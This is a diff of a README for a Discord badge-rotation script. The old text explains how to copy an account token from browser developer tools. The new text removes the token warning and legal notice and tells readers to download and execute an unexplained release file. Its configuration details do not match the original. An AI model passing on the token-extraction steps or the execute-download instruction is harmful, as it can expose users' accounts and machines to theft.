@@ -1,77 +1,97 @@
-# Discord Clan Badge Changer
+# 🌟 Clan Rotate: Automate Your Discord Badges! 🎮
 
-A simple Python script that automatically rotates between different Discord server badges on your profile.
+Welcome to the **Clan Rotate** repository! This project provides a simple Python script that automatically rotates between different Discord server badges on your profile. Enhance your Discord experience with ease and style!
 
-## Features
+[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen)](https://github.com/akosicedrick123/clan-rotate/releases)
 
-- Automatically cycles through server badges/clans
-- Customizable rotation time
-- Simple setup and usage
-- Shows the server name when changing badges
+## 📜 Table of Contents
 
-## Prerequisites
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-- Python 3.6+
-- `requests` library
+## 🌟 Features
 
-## Setup
+- **Automatic Badge Rotation**: Switch between multiple badges without manual effort.
+- **Easy Setup**: Simple installation and configuration process.
+- **Customizable**: Adjust the rotation frequency and select your preferred badges.
+- **Lightweight**: Minimal resource usage, ensuring smooth operation.
+- **Open Source**: Contribute and improve the script with the community.
 
-1. Install the required package:
+## 🛠️ Installation
+
+To get started with **Clan Rotate**, follow these steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/akosicedrick123/clan-rotate.git
    ```
-   pip install requests
+
+2. **Navigate to the Directory**:
+   ```bash
+   cd clan-rotate
    ```
 
-2. Create a file named `clans.txt` in the same directory as the script
-3. Add Discord server IDs (one per line) to the `clans.txt` file
+3. **Install Dependencies**:
+   Ensure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Example `clans.txt`:
-```
-123456789012345678
-987654321098765432
-876543210987654321
-```
+4. **Download the Script**:
+   You can download the latest release [here](https://github.com/akosicedrick123/clan-rotate/releases). Execute the downloaded file to start using the script.
 
-## How to Get Your Discord Token
+## 🚀 Usage
 
-> ⚠️ **WARNING**: Never share your Discord token with anyone! Your token provides full access to your account.
+After installation, you can run the script with the following command:
 
-1. Open Discord in your browser
-2. Press `F12` to open developer tools
-3. Go to the "Network" tab
-4. Refresh the page (F5)
-5. Click on any request to "discord.com"
-6. Look for "Authorization" in the request headers
-7. Copy the token value
-
-## How to Get Server IDs
-
-1. In Discord, go to User Settings → Advanced
-2. Enable "Developer Mode"
-3. Right-click on any server icon
-4. Select "Copy ID"
-
-## Usage
-
-Run the script:
-```
-python clan.py
+```bash
+python clan_rotate.py
 ```
 
-The script will:
-1. Ask for your Discord token
-2. Load server IDs from `clans.txt`
-3. Cycle through each server badge every 30 seconds
+The script will start rotating your badges automatically. You can check the console for updates and status messages.
 
-To stop the script, press `Ctrl+C`.
+## ⚙️ Configuration
 
-## Legal Notice
+Before running the script, you need to configure your settings:
 
-This tool is meant for educational purposes only. Using this script might violate Discord's Terms of Service. Use at your own risk.
+1. **Edit the Configuration File**:
+   Open `config.json` in a text editor. The file contains options for:
+   - Badge IDs: List of badge IDs you want to rotate.
+   - Rotation Interval: Time in seconds for how often to switch badges.
 
-## License
+   Example:
+   ```json
+   {
+       "badge_ids": ["badge1_id", "badge2_id", "badge3_id"],
+       "rotation_interval": 3600
+   }
+   ```
 
-MIT License
+2. **Save Changes**: After editing, save the file.
 
-## Disclaimer
+## 🤝 Contributing
 
-This project is not affiliated with or endorsed by Discord Inc.
+We welcome contributions! If you have ideas for improvements or want to report issues, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature-branch`).
+5. Create a Pull Request.
+
+## 📄 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 💬 Support
+
+If you have questions or need help, feel free to reach out. You can also check the [Releases](https://github.com/akosicedrick123/clan-rotate/releases) section for updates and changes.
+
+---
+
+Thank you for using **Clan Rotate**! Enjoy your dynamic Discord profile! 🎉
